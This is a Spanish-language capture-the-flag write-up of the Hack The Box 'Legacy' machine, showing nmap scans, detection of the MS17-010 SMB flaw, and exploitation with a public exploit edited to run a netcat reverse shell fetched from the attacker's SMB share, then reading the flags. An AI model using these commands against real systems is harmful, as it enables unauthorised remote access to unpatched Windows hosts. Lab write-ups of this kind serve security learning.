![cover](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/legacy.jpg)

## Windows - Easy
IP = 10.10.10.4

### USER ###

*** 
Ejecutamos nmap 
    
    nmap -p- --open --min-rate 5000 -n -Pn -vvv -oG allPorts 10.10.10.4
    
![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/allPorts.jpg)

    nmap -p139,445 -sV -sC -vv -Pn -oN targeted 10.10.10.4

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/targeted.jpg)

Realizamos un escaneo de las vulnerabilidades del servicio smb

    nmap -p 445 --script "vuln and safe" -Pn -oN servicioScan 10.10.10.4

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/smbScan.jpg)

Nos muestra que el servicio es vulnerable al MS17-010


Nos descargamos el exploit de: 
https://github.com/worawit/MS17-010

Ejecutamos el checker.py para comprobar syi los named pipes responden

    python2 checker.py 10.10.10.4

Comprobamos que el spoolss y el browser son vulnerables.
![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/checker.jpg)


Ahora vamos a explotar la vulnerabilidad con el zzz_exploit.py pero antes tenemos que editar para que nos ejecute nuestra reverse shell.
1.- buscamos en nuestro equipo con locate nc.exe y nos lo copiamos a la ruta que vamos a compartir

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/locate.jpg)
![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/cp.jpg)

2.- editamos el exploit para indicarle como va a ser nuestra reverse shell.
Comentamos las lineas que ya no queremos que se ejecuten (flecha de arriba) e incluimos nuestra ejecucion (flecha de abajo)

     service_exec(conn, r'cmd /c \\10.10.14.2\smb\nc.exe -e cmd.exe 10.10.14.2 4444')

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/exploit.jpg)

3.- Ejecutamos el exploit
Para ejecutar el exploit tenemos que hacer varias cosas.
   1.- Compartimos una ruta de la cual vamos a coger el nc.exe con impacket y le indicamos que soporte smb2
                                
      impacket-smbserver smb $(pwd) -smb2support
      
   2.- Ponemos el puerto configuracido para la reverse shell a la escucha en nuestra maquina 
    
      nc -lvp 4444

   3.- Ejecutamos el zzz_exploit.py
   
    python2 zzz_exploit.py 10.10.10.4 spoolss

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/accesLegacy.jpg)
![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/acceso.jpg)
    
Accedemos a la carpeta del usuario y en el escritorio encontramos la flag  

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/user.jpg)
      
### Root ###
***

Ejeutamos cd en la caperta de administrador y vemos que nos permite el acceso, vamos al escritorio y encontramos la flag

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/legacy/root.jpg)
